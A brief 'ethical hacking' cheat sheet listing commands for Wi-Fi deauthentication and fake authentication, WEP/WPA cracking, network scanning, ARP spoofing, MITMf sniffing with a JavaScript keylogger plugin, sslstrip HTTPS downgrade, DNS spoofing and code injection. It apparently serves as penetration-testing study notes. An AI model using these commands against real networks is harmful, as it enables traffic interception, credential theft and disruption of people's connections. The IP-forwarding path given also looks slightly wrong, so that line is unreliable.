This is a cheatsheet for commands and tools commonly used for ethical hacking.

1) Change Mac      : a) ifconfig ath0 down b) ifconfig ath0 hw ether <new_mac> c) ifconfig ath0 up

2) Sniffing Packets: a) airodump-ng wlan0 or b) airodump-ng --bssid <ap_mac> --channel <channel> --write <out_file> wlan0

3) Deauth          : a)  aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
4) Fake Auth       : a)  aireplay-ng -1 0 -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 ath0

5) Cracking WEP/WPA: Use of aircrack-ng depends on encryption

6) Reconnaissance  : a) netdiscover -r 10.0.2.1/24 b) nmap / zenmap(GUI)

MITM:
7) ARP Spoof       : a) arpspoof -i ath0 -t 10.0.2.9 10.0.2.1 b) arpspoof -i ath0 -t 10.0.2.1 10.0.2.9 c) echo "1" > /proc/sys/net/ipv4/ip_forwarding

8) MITMF           : a) mitmf --arp --spoof --gateway 10.0.2.1 --target 10.0.2.9 -i ath0   --- this command is arp spoof + sniffing. Contains many other plugins such as --screen, --jskeylogger

9) HTTPS           : Use sslstrip to downgrade https to http. MITMF commands deploy it.

10) DNS Spoof      : a) Add dns entry to /etc/mitmf/mitmf.conf b) mitmf --arp --spoof --gateway 10.0.2.1 --target 10.0.2.9 -i ath0 --dns 
 
11) Inject code    : a) Use mitmf with --inject --js-payload 'alert("test");'
